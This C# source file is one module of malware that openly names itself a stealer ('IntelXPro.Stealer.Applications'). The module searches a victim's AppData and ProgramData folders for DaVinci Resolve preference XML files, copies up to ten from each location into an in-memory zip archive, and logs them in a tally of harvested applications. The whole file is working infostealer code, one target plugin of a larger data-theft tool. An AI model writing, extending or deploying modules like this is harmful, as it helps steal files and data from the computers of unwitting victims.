using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class DaVinciResolve : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Blackmagic Design", "DaVinci Resolve");
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Blackmagic Design", "DaVinci Resolve");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "DaVinciResolve";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string preferencesPath = Path.Combine(basePath, "Preferences");
                if (Directory.Exists(preferencesPath))
                {
                    string[] xmlFiles = Directory.GetFiles(preferencesPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in xmlFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\DaVinciResolve\\{location}\\Preferences\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
